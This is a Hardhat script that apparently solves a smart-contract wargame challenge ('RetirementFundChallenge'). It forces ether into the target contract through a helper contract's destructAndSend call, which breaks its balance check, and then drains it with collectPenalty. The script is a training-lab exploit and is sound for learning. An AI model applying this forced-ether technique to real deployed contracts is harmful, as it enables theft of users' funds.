const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker, addr1, addr2] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("RetirementFundChallenge", deployer);
  const HackContract = await ethers.getContractFactory("RetirementFundHack", attacker);

  const mainContract = await MainContract.deploy(attacker.address, { value: ethers.utils.parseEther("1") });
  const hackContract = await HackContract.deploy();

  await attacker.sendTransaction({ to: hackContract.address, value: ethers.utils.parseEther("2") });

  await hackContract.destructAndSend(mainContract.address);
  await mainContract.connect(attacker).collectPenalty();
  console.log("IS COMPLETED:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
